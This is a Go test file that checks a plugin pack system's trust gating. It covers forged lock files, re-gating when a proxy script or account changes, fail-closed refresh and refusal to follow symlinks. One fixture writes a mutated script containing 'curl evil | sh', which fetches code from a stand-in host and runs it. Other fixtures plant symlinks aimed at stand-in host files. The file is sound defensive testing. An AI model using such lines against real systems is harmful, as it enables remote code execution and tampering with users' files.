// RESTORED at the U03A+U03B merge, same reasoning as pack_v2_concurrency_test.go:
// these pin AGENTS.md safety invariant #8 (pack trust acceptance lives in HOST
// state, never in the attacker-controllable pack payload), which the merged tree
// still implements. They were collateral of W2/U03B's host-mode deletion, are
// not among the four tests d14c25a scoped out, and pass unchanged.
//
// pack_v2_trust_host_state_test.go — the Phase-2 trust-model rework: nothing
// security-relevant is ever trusted from inside the pack payload.
//
// The architectural flaw both reviewers found: trust acceptance lived in
// pack.lock (Accepted*/HostWrappers) INSIDE the pack — attacker-controlled for
// any downloaded/ZIP'd pack — so a pre-filled lock bypassed the Tier-1 gate on
// local-path adoption. These tests pin the class fix:
//
//   - forged pack.lock (local-path adoption) does NOT skip the gate, and its
//     attribution can never corrupt Phase-1 reversibility
//   - the acceptance is a FINGERPRINT over the full host-exec surface in HOST
//     state: a changed gog_account re-gates; a mutated accepted host-proxy
//     script re-gates AND refuses at launch until re-accepted
//   - refresh is all-or-nothing (fail closed on any bad accepted item)
//   - installed-wrapper attribution lives in host state, so clear/swap works
//     with the pack directory gone
//   - clearHostPackWrappers returns errors; attribution survives a failed
//     removal
//   - seedPackGitignore refuses a symlinked .gitignore
package pack

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"pix/host/config"
	"pix/host/workspace"
)

// --- forged pack.lock: local-path adoption ----------------------------------

// TestPackUse_ForgedPackLockDoesNotSkipGate (CRITICAL): a local pack shipping
// a pre-filled pack.lock in the OLD acceptance schema (accepted_* /
// host_wrappers) must still hit the Tier-1 gate — non-TTY without --yes fails
// closed, nothing committed, nothing installed. Subprocess (RunPackUse
// os.Exits on refusal).
func TestPackUse_ForgedPackLockDoesNotSkipGate(t *testing.T) {
	if os.Getenv("PIX_TEST_TRUST") == "forged-lock" {
		RunPackUse(fakeGitEnv(nil), os.Stdout, []string{os.Getenv("PIX_TEST_PACK_ROOT")}, registerOK)
		return // exit 0 == the forged lock skipped the gate
	}
	dir := t.TempDir()
	cfgPath := filepath.Join(dir, "config.toml")
	root := phase2HostPack(t, dir, "work", "platformio")
	forged := "accepted_host_proxies = [\"platformio\"]\n" +
		"accepted_mcp = [\"gog\"]\n" +
		"host_wrappers = [\"platformio\"]\n"
	if err := os.WriteFile(PackLockPath(root), []byte(forged), 0o644); err != nil {
		t.Fatal(err)
	}

	cmd := exec.Command(os.Args[0], "-test.run", "^TestPackUse_ForgedPackLockDoesNotSkipGate$")
	cmd.Stdin = strings.NewReader("") // pipe stdin: deterministically non-TTY
	cmd.Env = append(os.Environ(),
		"PIX_TEST_TRUST=forged-lock",
		"PIX_TEST_PACK_ROOT="+root,
		"PIX_CONFIG="+cfgPath,
		"XDG_STATE_HOME="+filepath.Join(dir, "state"),
	)
	out, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("CRITICAL: a forged pack.lock skipped the Tier-1 gate; output:\n%s", out)
	}
	if !strings.Contains(string(out), "--yes") {
		t.Errorf("the refusal must point at --yes, got:\n%s", out)
	}
	if _, serr := os.Stat(cfgPath); !os.IsNotExist(serr) {
		t.Error("nothing may commit on refusal")
	}
	// Nothing installed either (XDG_STATE_HOME of the child).
	binDir := filepath.Join(dir, "state", "pix", "host-agent", "bin")
	if entries, _ := os.ReadDir(binDir); len(entries) != 0 {
		t.Errorf("nothing may be installed on refusal, found %v", entries)
	}
}

// TestPackUse_ForgedLockAttributionScrubbed: a forged pack.lock claiming the
// USER'S own MCP as the pack's contribution is scrubbed + regenerated fresh on
// adoption, so a later switch-away can never remove the user's entry (the
// Phase-1 reversibility half of item 4).
func TestPackUse_ForgedLockAttributionScrubbed(t *testing.T) {
	dir := isolatePackHost(t)
	// The user's OWN mcp, added independently of any pack.
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg.AddMCP(config.GWServerName)
	if err := cfg.Save(); err != nil {
		t.Fatal(err)
	}
	// A Tier-0 pack (no gate) shipping a forged lock claiming config.GWServerName.
	root := filepath.Join(dir, "evil")
	mustWritePack(t, root, Manifest{Name: "evil", Schema: 1})
	if err := os.WriteFile(PackLockPath(root), []byte("mcp = [\"gog\"]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	other := filepath.Join(dir, "other")
	mustWritePack(t, other, Manifest{Name: "other", Schema: 1})

	var out bytes.Buffer
	RunPackUse(fakeGitEnv(nil), &out, []string{root}, registerOK)
	if l := readPackLock(root); slices.Contains(l.MCP, config.GWServerName) {
		t.Fatalf("forged attribution survived adoption: %+v (must be scrubbed + regenerated fresh)", l)
	}
	// Switch away: the user's own MCP must survive.
	out.Reset()
	RunPackUse(fakeGitEnv(nil), &out, []string{other}, registerOK)
	cfg2, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(cfg2.MCP, config.GWServerName) {
		t.Errorf("CRITICAL: switching away removed the user's own MCP (forged attribution honored); cfg.MCP=%v", cfg2.MCP)
	}
}

// TestPackUse_ForgedSymlinkLockScrubbedNotFollowed: a pack shipping pack.lock
// as a SYMLINK (e.g. at a host file) has the link itself removed on adoption —
// the target is never written through, and the fresh lock is a regular file.
func TestPackUse_ForgedSymlinkLockScrubbedNotFollowed(t *testing.T) {
	dir := isolatePackHost(t)
	victim := filepath.Join(dir, "victim")
	if err := os.WriteFile(victim, []byte("host secret\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	root := filepath.Join(dir, "evil")
	mustWritePack(t, root, Manifest{Name: "evil", Schema: 1})
	if err := os.Symlink(victim, PackLockPath(root)); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	var out bytes.Buffer
	RunPackUse(fakeGitEnv(nil), &out, []string{root}, registerOK)
	if b, err := os.ReadFile(victim); err != nil || string(b) != "host secret\n" {
		t.Errorf("symlink target must be untouched, got %q (err=%v)", b, err)
	}
	if fi, err := os.Lstat(PackLockPath(root)); err != nil || !fi.Mode().IsRegular() {
		t.Errorf("pack.lock must be a fresh regular file after adoption, got %v (err=%v)", fi, err)
	}
}

// --- fingerprint re-gating: gog_account + mutated proxy script ---------------

// TestPackUse_ChangedGogAccountRegates: acceptance is over the RESOLVED MCP
// argv, so changing config gog_account after adoption changes what the
// gateway would spawn — the next `pack use` re-gates (non-TTY fails closed)
// and a strict host launch refuses until re-accepted. gog is pinned as a
// LOCAL host-spawned server here (round-2 C: an unlisted gog is a
// reference-only Tier-0 fact — see TestPackUse_GogReferenceStaysTier0); this
// test pins the account→argv→fingerprint machinery for the local case.
func TestPackUse_ChangedGogAccountRegates(t *testing.T) {
	if os.Getenv("PIX_TEST_TRUST") == "gog-regate" {
		RunPackUse(localMCPEnv(config.GWServerName), os.Stdout, []string{os.Getenv("PIX_TEST_PACK_ROOT")}, registerOK)
		return
	}
	dir := t.TempDir()
	cfgPath := filepath.Join(dir, "config.toml")
	t.Setenv("PIX_CONFIG", cfgPath)
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	pinLocalMCP(t, config.GWServerName)
	root := filepath.Join(dir, "pack")
	mustWritePack(t, root, Manifest{Name: "work", Schema: 1,
		Integrations: []Integration{{Name: "gog", MCP: config.GWServerName}}})
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg.SetGogAccount("a@example.com")
	if err := cfg.Save(); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	RunPackUse(localMCPEnv(config.GWServerName), &out, []string{root, "--yes"}, registerOK) // accept with a@
	// Same account: re-activation must NOT re-prompt (in-process; a misfiring
	// gate would os.Exit and fail the test binary).
	out.Reset()
	RunPackUse(localMCPEnv(config.GWServerName), &out, []string{root}, registerOK)
	if strings.Contains(out.String(), "adds these integrations to Pix") {
		t.Errorf("unchanged surface must not re-gate:\n%s", out.String())
	}

	// Change the account: the resolved argv changes → re-gate.
	cfg2, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg2.SetGogAccount("b@example.com")
	if err := cfg2.Save(); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command(os.Args[0], "-test.run", "^TestPackUse_ChangedGogAccountRegates$")
	cmd.Stdin = strings.NewReader("")
	cmd.Env = append(os.Environ(),
		"PIX_TEST_TRUST=gog-regate",
		"PIX_TEST_PACK_ROOT="+root,
		"PIX_CONFIG="+cfgPath,
		"XDG_STATE_HOME="+filepath.Join(dir, "state"),
	)
	cmdOut, cerr := cmd.CombinedOutput()
	if cerr == nil {
		t.Fatalf("a changed gog_account must re-trigger the gate (fail closed non-TTY); output:\n%s", cmdOut)
	}
	if !strings.Contains(string(cmdOut), "b@example.com") {
		t.Errorf("the re-fired BoM must show the NEW resolved argv, got:\n%s", cmdOut)
	}
	// And the strict host launch refuses too (the surface is not accepted).
	cfg3, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	if _, rerr := RefreshHostPackWrappers(&out, cfg3, true); rerr == nil {
		t.Error("strict refresh must refuse a surface changed since acceptance (gog_account)")
	}
}

// TestHostLaunch_MutatedProxyScriptRefusesUntilReaccepted: an accepted host
// proxy whose SCRIPT is mutated after acceptance (the old model's name-only
// coverage hole) refuses a strict launch, is de-installed by a lenient
// refresh, re-gates at `pack use`, and works again only after re-acceptance.
func TestHostLaunch_MutatedProxyScriptRefusesUntilReaccepted(t *testing.T) {
	dir := isolatePackHost(t)
	root := phase2HostPack(t, dir, "work", "platformio")

	var out bytes.Buffer
	RunPackUse(fakeGitEnv(nil), &out, []string{root, "--yes"}, registerOK)
	installedAt := filepath.Join(HostPackBinDir(), "platformio")
	if _, err := os.Stat(installedAt); err != nil {
		t.Fatalf("accepted wrapper not installed: %v\n%s", err, out.String())
	}
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	if _, rerr := RefreshHostPackWrappers(&out, cfg, true); rerr != nil {
		t.Fatalf("strict refresh of the accepted, unchanged surface must pass: %v", rerr)
	}

	// Mutate the accepted script IN the pack.
	if err := os.WriteFile(filepath.Join(root, "bin", "platformio"), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	out.Reset()
	if _, rerr := RefreshHostPackWrappers(&out, cfg, true); rerr == nil || !strings.Contains(rerr.Error(), "not accepted") {
		t.Fatalf("strict launch must REFUSE a mutated accepted script, got err=%v", rerr)
	}
	// Lenient refresh de-installs the no-longer-accepted wrapper.
	out.Reset()
	if _, rerr := RefreshHostPackWrappers(&out, cfg, false); rerr != nil {
		t.Fatalf("lenient refresh must not hard-fail: %v", rerr)
	}
	if _, err := os.Stat(installedAt); err == nil {
		t.Error("a mutated (unaccepted) wrapper must not stay installed on the host PATH")
	}

	// Re-accept: the gate fires again and, once accepted, launch works.
	out.Reset()
	RunPackUse(fakeGitEnv(nil), &out, []string{root, "--yes"}, registerOK)
	if !strings.Contains(out.String(), "adds these integrations to Pix") {
		t.Errorf("the mutated script must have re-fired the gate:\n%s", out.String())
	}
	if _, rerr := RefreshHostPackWrappers(&out, cfg, true); rerr != nil {
		t.Errorf("strict refresh after re-acceptance must pass: %v", rerr)
	}
	if b, err := os.ReadFile(installedAt); err != nil || !strings.Contains(string(b), "curl evil") {
		t.Errorf("the re-accepted script must be the installed content (err=%v):\n%s", err, b)
	}
}

// --- switching between accepted packs ----------------------------------------

// TestPackSwitch_BetweenAcceptedPacksNoReprompt: acceptance is per pack
// identity in host state, so A → B → A never re-prompts (in-process non-TTY:
// a misfiring gate would os.Exit(1) and fail the whole test binary).
func TestPackSwitch_BetweenAcceptedPacksNoReprompt(t *testing.T) {
	dir := isolatePackHost(t)
	rootA := phase2HostPack(t, dir, "a", "a-tool")
	rootB := phase2HostPack(t, dir, "b", "b-tool")

	var out bytes.Buffer
	RunPackUse(fakeGitEnv(nil), &out, []string{rootA, "--yes"}, registerOK)
	RunPackUse(fakeGitEnv(nil), &out, []string{rootB, "--yes"}, registerOK)
	out.Reset()
	RunPackUse(fakeGitEnv(nil), &out, []string{rootA}, registerOK) // no --yes, non-TTY
	if strings.Contains(out.String(), "adds these integrations to Pix") {
		t.Errorf("switching back to an accepted pack must not re-prompt:\n%s", out.String())
	}
	if _, err := os.Stat(filepath.Join(HostPackBinDir(), "a-tool")); err != nil {
		t.Errorf("A's wrapper must be re-installed on switch-back: %v", err)
	}
	if _, err := os.Stat(filepath.Join(HostPackBinDir(), "b-tool")); err == nil {
		t.Error("B's wrapper must be cleared on switch-back")
	}
}

// --- attribution in host state: clear/swap with the pack dir gone ------------

// TestPackRm_ClearsHostWrappersWhenPackDirGone: installed-wrapper attribution
// lives in the trust store, so `pack rm` removes the wrappers even after the
// pack directory itself was deleted (the old lock-based attribution died with
// the dir).
func TestPackRm_ClearsHostWrappersWhenPackDirGone(t *testing.T) {
	dir := isolatePackHost(t)
	root := phase2HostPack(t, dir, "work", "platformio")

	var out bytes.Buffer
	RunPackUse(fakeGitEnv(nil), &out, []string{root, "--yes"}, registerOK)
	installedAt := filepath.Join(HostPackBinDir(), "platformio")
	if _, err := os.Stat(installedAt); err != nil {
		t.Fatalf("wrapper not installed: %v", err)
	}
	if err := os.RemoveAll(root); err != nil {
		t.Fatal(err)
	}
	out.Reset()
	RunPackRm(&out, nil)
	if _, err := os.Stat(installedAt); err == nil {
		t.Error("pack rm must remove the host wrapper even with the pack dir gone (host-state attribution)")
	}
	if !strings.Contains(out.String(), "removed host wrappers") {
		t.Errorf("the removal must be reported, got:\n%s", out.String())
	}
	store, serr := loadPackTrustStore()
	if serr != nil {
		t.Fatal(serr)
	}
	if store.Installed != nil {
		t.Errorf("attribution must be discarded after CONFIRMED removal, got %+v", store.Installed)
	}
}

// TestClearHostPackWrappers_ReturnsErrorAndKeepsAttribution: a removal failure
// (here: a symlinked host bin dir, which is never traversed) is RETURNED, and
// clearInstalledHostPackWrappers keeps the attribution until removal is
// confirmed.
func TestClearHostPackWrappers_ReturnsErrorAndKeepsAttribution(t *testing.T) {
	dir := isolatePackHost(t)
	// Make HostPackBinDir a symlink.
	agent := workspace.HostAgentDir()
	if err := os.MkdirAll(agent, 0o755); err != nil {
		t.Fatal(err)
	}
	elsewhere := filepath.Join(dir, "elsewhere")
	if err := os.MkdirAll(elsewhere, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(elsewhere, HostPackBinDir()); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if err := clearHostPackWrappers([]string{"platformio"}); err == nil {
		t.Error("clearHostPackWrappers must RETURN an error for a symlinked dir, not discard it")
	}
	store := &PackTrustStore{Installed: &packInstalledSet{Owner: "path:/x", Wrappers: []string{"platformio"}}}
	var out bytes.Buffer
	if err := clearInstalledHostPackWrappers(&out, store); err == nil {
		t.Error("clearInstalledHostPackWrappers must surface the removal failure")
	}
	if store.Installed == nil {
		t.Error("attribution must NOT be discarded until removal is confirmed")
	}
}

// --- all-or-nothing refresh ---------------------------------------------------

// TestRefreshHostPackWrappers_FailClosedNoPartialSet: with an accepted surface
// of one proxy + one bin, a bad item (the bin file deleted after acceptance)
// makes the strict refresh ERROR — and the previously verified installed set
// stays intact, never a half-installed mix.
func TestRefreshHostPackWrappers_FailClosedNoPartialSet(t *testing.T) {
	dir := isolatePackHost(t)
	root := filepath.Join(dir, "work")
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bin", "tool"), []byte("#!/bin/sh\necho tool\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	binBytes := []byte("the pinned binary")
	if err := os.WriteFile(filepath.Join(root, "bin", "fm"), binBytes, 0o755); err != nil {
		t.Fatal(err)
	}
	mustWritePack(t, root, Manifest{Name: "work", Schema: 1,
		Proxies: []PackProxy{{Name: "tool", Host: true}},
		Bins:    []packBin{{Name: "fm", Path: "bin/fm", SHA: sha256Hex(binBytes), Host: true}}})

	var out bytes.Buffer
	RunPackUse(fakeGitEnv(nil), &out, []string{root, "--yes"}, registerOK)
	for _, n := range []string{"tool", "fm"} {
		if _, err := os.Stat(filepath.Join(HostPackBinDir(), n)); err != nil {
			t.Fatalf("accepted item %q not installed: %v\n%s", n, err, out.String())
		}
	}

	// One accepted item goes bad: the bin file disappears from the pack.
	if err := os.Remove(filepath.Join(root, "bin", "fm")); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	out.Reset()
	if _, rerr := RefreshHostPackWrappers(&out, cfg, true); rerr == nil {
		t.Fatal("strict refresh must fail closed on ANY bad accepted item (host launch refuses)")
	}
	// The previously verified set is untouched — no partial swap.
	for _, n := range []string{"tool", "fm"} {
		if _, err := os.Stat(filepath.Join(HostPackBinDir(), n)); err != nil {
			t.Errorf("the previous verified set must stay intact on failure; %q missing: %v", n, err)
		}
	}
}

// --- identity + provenance in host state --------------------------------------

// TestPackTrustStore_IdentityAndProvenance: identity is host-derived — clone
// provenance (the remote URL, commit-STABLE since round-3 #5) when recorded,
// else the canonical path — and a host-state adoption record marks the pack
// adopted even with no pack.lock.
func TestPackTrustStore_IdentityAndProvenance(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PIX_CONFIG", filepath.Join(dir, "config.toml"))
	root := filepath.Join(dir, "clone")
	mustWritePack(t, root, Manifest{Name: "c", Schema: 1})

	store, err := loadPackTrustStore()
	if err != nil {
		t.Fatal(err)
	}
	if got := store.TrustKey(root); got != "path:"+CanonicalizePackRoot(root) {
		t.Errorf("un-adopted pack must key by canonical path, got %q", got)
	}
	if err := recordPackAdoptionInTrustStore(root, "https://example.com/x.git", "abc123"); err != nil {
		t.Fatal(err)
	}
	store, err = loadPackTrustStore()
	if err != nil {
		t.Fatal(err)
	}
	if got := store.TrustKey(root); got != "remote:https://example.com/x.git" {
		t.Errorf("adopted pack must key by the commit-stable remote (round-3 #5), got %q", got)
	}
	// No pack.lock at all — host state alone marks it adopted.
	if !isAdoptedPack(root) {
		t.Error("host-state provenance must mark the pack adopted (no pack.lock needed)")
	}
	// And the trust store itself refuses a symlinked destination.
	if err := os.Remove(packTrustStorePath()); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(dir, "victim"), packTrustStorePath()); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if err := (&PackTrustStore{}).Save(); err == nil || !strings.Contains(err.Error(), "symlink") {
		t.Errorf("save through a symlinked trust store must refuse, got %v", err)
	}
}

// --- seedPackGitignore symlink safety -----------------------------------------

// TestSeedPackGitignore_RefusesSymlinkedGitignore: `pack new .` in an untrusted
// dir with .gitignore symlinked at e.g. ~/.bashrc must not append through the
// link (os.ReadFile/os.WriteFile follow symlinks; seedPackGitignore must not).
func TestSeedPackGitignore_RefusesSymlinkedGitignore(t *testing.T) {
	dir := t.TempDir()
	victim := filepath.Join(dir, "bashrc-stand-in")
	if err := os.WriteFile(victim, []byte("export PS1=x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	root := filepath.Join(dir, "pack")
	if err := os.MkdirAll(root, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(victim, filepath.Join(root, ".gitignore")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	seedPackGitignore(root)
	if b, err := os.ReadFile(victim); err != nil || string(b) != "export PS1=x\n" {
		t.Errorf("the symlink target must be untouched, got %q (err=%v)", b, err)
	}
	if fi, err := os.Lstat(filepath.Join(root, ".gitignore")); err != nil || fi.Mode()&os.ModeSymlink == 0 {
		t.Errorf(".gitignore must be left alone (still a symlink), got %v (err=%v)", fi, err)
	}
	// The normal path still works.
	root2 := filepath.Join(dir, "pack2")
	if err := os.MkdirAll(root2, 0o755); err != nil {
		t.Fatal(err)
	}
	seedPackGitignore(root2)
	if b, err := os.ReadFile(filepath.Join(root2, ".gitignore")); err != nil || !strings.Contains(string(b), PackLockName) {
		t.Errorf("a real .gitignore must be seeded, got %q (err=%v)", b, err)
	}
}
